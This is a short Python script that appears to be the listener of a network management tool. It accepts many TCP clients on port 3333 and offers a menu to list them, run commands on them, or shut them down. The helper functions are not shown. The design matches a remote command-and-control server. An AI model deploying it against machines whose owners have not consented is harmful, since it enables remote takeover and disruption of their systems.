from socket import *
import threading
from managmentNetworkSW_funcs import menu, get_all_clients, execute_command, shutdownMacine, closeClientSession


def clients_manager(server):
    while True:
        client, addr = server.accept()
        clients.append([client, addr]) # list of --> [socket, 10.0.0.1]


server = socket(AF_INET, SOCK_STREAM)
server.bind(("0.0.0.0", 3333))
server.listen(100)

clients = []

t = threading.Thread(target=clients_manager, args=(server,))
t.start()


while True:
    menu()
    try:
        option = int(input("[+] Command --> "))
    except:
        print("Syntax Error")
        continue
    try:
        if option == 1:
            get_all_clients(clients)
        elif option == 2:
            execute_command(clients)
        elif option == 3:
            shutdownMacine(clients)
        elif option == 0:
            closeClientSession(clients)
    except:
        print("OS command syntax error")
